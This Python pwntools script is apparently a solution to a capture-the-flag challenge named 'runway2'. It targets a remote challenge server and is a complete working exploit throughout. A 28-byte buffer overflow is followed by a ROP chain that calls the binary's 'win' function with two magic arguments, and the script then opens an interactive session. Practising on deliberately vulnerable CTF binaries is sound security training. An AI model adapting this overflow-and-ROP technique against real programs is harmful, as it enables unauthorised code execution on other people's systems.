from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
context.binary = elf = ELF("runway2")
gdbscript = """
init-gef
b win
continue
"""
#p = gdb.debug(elf.path, gdbscript=gdbscript)
#p = process()
p = remote("challs.pwnoh.io", 13402)

offset = 28
win = p32(elf.sym['win'])
rop = ROP(elf)
rop.call(win, [0xc0ffee, 0x007ab1e])

# Craft the payload with the ROP chain
payload = b"A" * offset  # Overwrite the buffer
payload += rop.chain() 

p.sendline(payload)
p.interactive()
